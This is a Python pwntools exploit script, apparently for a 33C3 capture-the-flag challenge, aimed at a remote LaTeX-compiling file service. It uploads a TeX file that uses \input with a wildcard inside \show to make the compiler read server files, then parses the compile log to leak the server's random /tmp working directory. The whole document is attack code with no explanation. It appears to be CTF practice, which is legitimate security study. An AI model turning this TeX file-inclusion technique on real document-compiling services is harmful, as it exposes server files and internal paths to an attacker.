from pwn import *


def create(t, filename, content):
    p.sendline('create {} {}'.format(t, filename))
    p.recvline_contains('File created')
    p.send(content)
    p.recvuntil('\n> ')


def compile_pdf(filename):
    p.sendline('compile {}'.format(filename))
    return p.recvuntil('\n> ')[:-3]


def show(t, filename):
    p.sendline('show {} {}'.format(t, filename))
    return p.recvuntil('\n> ')[:-3]

# context.log_level = 'debug'

p = remote('78.46.224.91', 24242)

first_content = r"""
\documentclass{minimal}
\begin{document}
\show{\input{33C3*}}
\end{document}
\q
"""

p.recvuntil('> ')
create('log', 'flag', 'THIS IS THE FLAG!\n\q\n')
create('tex', 'first', first_content)
compile_pdf('first')

s = show('log', 'first')
s = s.split('\n')[4]
dir_rand = s[s.index('tmp/')+4:s.rindex('/first.tex')]

log.success('/tmp/{}'.format(dir_rand))

print show('log', 'first')
